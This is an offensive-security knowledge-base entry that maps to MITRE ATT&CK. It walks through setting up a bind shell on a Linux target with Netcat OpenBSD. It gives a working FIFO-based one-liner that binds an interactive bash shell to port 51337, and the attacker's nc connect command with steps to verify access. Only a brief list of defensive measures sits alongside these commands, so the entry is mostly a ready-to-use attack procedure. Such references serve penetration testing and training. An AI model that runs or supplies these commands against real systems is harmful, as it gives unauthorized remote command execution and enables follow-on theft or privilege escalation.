---
id: d9152afa-cfbb-46d8-8704-351c4a58a39c
name: Create-Bind-Shell-with-Netcat-OpenBSD
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:08.878593+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Command-Line Interface|T1059 - Command-Line Interface]]'
  - >-
    [[techniques/Standard Application Layer Protocol|T1071 - Standard
    Application Layer Protocol]]
sub_techniques: []
tags:
  - '[[tags/Bind Shell]]'
  - '[[tags/Netcat OpenBSD]]'
commands:
  - '[[commands/netcat-setup-bind-shell-on-target]]'
  - '[[commands/netcat-connect-to-bind-shell]]'
platforms:
  - Linux
tools:
  - '[[tools/Netcat-OpenBSD]]'
validated: true
---

# Create-Bind-Shell-with-Netcat-OpenBSD

## Summary

This procedure demonstrates how to create a bind shell on a Linux target machine using Netcat OpenBSD, allowing an attacker to connect remotely and execute commands. A bind shell opens a port on the target and waits for an incoming connection from the attacker's machine, providing remote access without requiring outbound connections from the target.

## Description

A bind shell is a remote access technique where the target machine listens on a specified port for an incoming connection, which, once established, provides the attacker with a shell session to execute commands. This contrasts with a reverse shell, where the target initiates the connection to the attacker. Netcat OpenBSD, a versatile networking tool, is used here to create the bind shell via a one-liner that leverages a named pipe (FIFO) to redirect input/output to a bash shell. This method is useful in post-exploitation scenarios where the attacker has command execution on the target but needs persistent remote access. It assumes the target has Netcat OpenBSD installed and the necessary permissions to create files in /tmp and bind to the port. Success grants interactive command execution, enabling further actions like data exfiltration or privilege escalation.

## Requirements

1. Command execution access on the target Linux machine (e.g., via initial foothold like SSH or RCE).
2. Netcat OpenBSD installed on the target (common on Unix-like systems; verify with `nc -h`).
3. Network connectivity between attacker and target, with the target port (e.g., 51337) not firewalled.
4. Attacker machine with Netcat for connecting.

## Defense

- Limit network access to only necessary ports and protocols using host-based firewalls (e.g., iptables, ufw).
- Block incoming connections from untrusted sources with network segmentation and ACLs.
- Regularly monitor network traffic for suspicious activity, such as unexpected listening ports or connections on high-numbered ports like 51337.
- Implement application whitelisting to restrict execution of tools like Netcat.
- Enable logging for process creation and network binds (e.g., via auditd or Sysmon) to detect anomalous shell spawns.

## Objectives

1. Establish a listening bind shell on the target machine using Netcat OpenBSD.
2. Connect from the attacker machine to gain remote shell access.
3. Execute arbitrary commands on the target via the established connection.

## Instructions

### Step 1: Set Up Bind Shell on Target

**Context**: On the target machine, execute a one-liner to create a FIFO pipe and bind a bash shell to a Netcat listener on port 51337. This waits for an incoming connection and pipes I/O to the shell. The code uses [[codes/Bash-Netcat-Bind-Shell-Using-FIFO]] for the payload.

**Code** ([[codes/Bash-Netcat-Bind-Shell-Using-FIFO]]):

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f
```

> This command removes any existing /tmp/f, creates a new FIFO, pipes cat output from the FIFO to a interactive bash shell (redirecting stdin, stdout, stderr), and uses Netcat to listen on port 51337 (verbose mode), piping incoming data back to the FIFO. If the port is in use or permissions are insufficient, it will fail with an error like "nc: bind: Address already in use" or "Permission denied". Verify the listener is active by checking `netstat -tuln | grep 51337` or `ss -tuln | grep 51337`, which should show the port listening.

### Step 2: Connect to Bind Shell from Attacker Machine

**Context**: From the attacker machine, connect to the target's bind shell using Netcat. This establishes the remote session, allowing command input and output.

**Command** ([[commands/netcat-connect-to-bind-shell]]):

```bash
nc -nv <target-ip> 51337
```

> Replace `<target-ip>` with the target's IP address. The `-n` flag skips DNS resolution, and `-v` provides verbose output showing connection details. Upon success, you will see output like "Connection to <target-ip> 51337 port [tcp/*] succeeded!" followed by a shell prompt. You can now execute commands like `whoami`, `ls`, or `id` to verify access. If the connection fails, check firewall rules, ensure the target listener is running, and confirm network reachability with `ping <target-ip>`.
